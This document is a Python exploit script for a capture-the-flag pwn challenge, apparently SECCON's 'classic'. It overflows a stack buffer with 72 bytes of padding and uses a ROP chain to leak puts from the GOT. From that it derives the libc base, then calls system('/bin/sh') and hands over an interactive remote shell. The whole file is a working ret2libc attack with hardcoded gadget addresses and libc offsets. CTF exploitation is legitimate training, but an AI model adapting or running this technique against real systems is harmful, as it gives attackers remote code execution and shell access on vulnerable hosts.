from socket import *
from telnetlib import Telnet
from time import time, sleep
from sys import argv
from struct import pack, unpack

def read_until(s, c):
    ret = b""
    while 1:
        ret += s.recv(1)
        if ret.endswith(c):
            return ret

def p(x):
    return pack("<Q", x)

def u(x):
    return unpack("<Q", x)[0]

def interact(s):
    print("[*] interactive mode")
    t = Telnet()
    t.sock = s
    t.interact()

if len(argv) >= 2 and argv[1] == "r":
    print("[*] connect to remote")
    HOST = "classic.pwn.seccon.jp"
    PORT = 17354
    PUTS_OFF = 0x6f690
    SYSTEM_OFF = 0x45390
    BINSH_OFF = 0x18cd57
else:
    print("[*] connect to local")
    HOST = "localhost"
    PORT = 28080
    PUTS_OFF = 0x000809c0
    SYSTEM_OFF = 0x0004f440
    BINSH_OFF = 0x001b3e9a

def main():
    payload = b"A" * 72
    payload += p(0x400753) # pop rdi
    payload += p(0x601018) # puts_got
    payload += p(0x400520) # puts_plt
    payload += p(0x4006A9) # main

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((HOST, PORT))

    #raw_input("DEBUG: ")

    sleep(1)
    read_until(s, b"Local Buffer >>")
    s.sendall(payload + b"\n")
    sleep(1)
    read_until(s, b"Have a nice pwn!!\n")
    puts_addr = u(read_until(s, b"\n")+b"A")
    puts_addr = hex(puts_addr)
    tmp = puts_addr[0:2]
    addr = puts_addr[-12:]
    puts_addr = int(tmp + addr, 16)
    print("puts_addr: ", hex(puts_addr))
    libc_addr = puts_addr - PUTS_OFF
    print("libc_addr: ", hex(libc_addr))

    system_addr = libc_addr + SYSTEM_OFF
    binsh_addr = libc_addr + BINSH_OFF
    print("system_addr: ", hex(system_addr))
    print("binsh_addr: ", hex(binsh_addr))

    payload2 = b"A" * 72
    payload2 += p(0x400753) # pop rdi
    payload2 += p(binsh_addr)   # /bin/sh
    payload2 += p(system_addr)  # system
    payload2 += b"BBBBBBBB"  # dummy

    sleep(1)
    read_until(s, b"Local Buffer >>")
    s.sendall(payload2 + b"\n")
    sleep(1)
    read_until(s, b"Have a nice pwn!!\n")

    interact(s)

if __name__ == "__main__":
    main()
